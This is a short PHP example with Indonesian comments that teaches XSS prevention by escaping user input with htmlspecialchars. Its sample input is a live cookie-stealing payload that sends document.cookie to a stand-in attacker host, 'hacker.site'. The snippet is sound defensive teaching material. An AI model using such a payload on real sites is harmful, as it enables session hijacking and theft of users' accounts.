<?php
// Pencegahan XSS kontekstual menggunakan htmlspecialchars pada output HTML.

$inputPengguna = "<script>document.location='http://hacker.site?c='+document.cookie;</script>";

$outputAman = htmlspecialchars($inputPengguna, ENT_QUOTES | ENT_HTML5, 'UTF-8');

echo "Input Berbahaya:\n{$inputPengguna}\n\n";
echo "Output Setelah Sanitasi XSS:\n{$outputAman}\n";
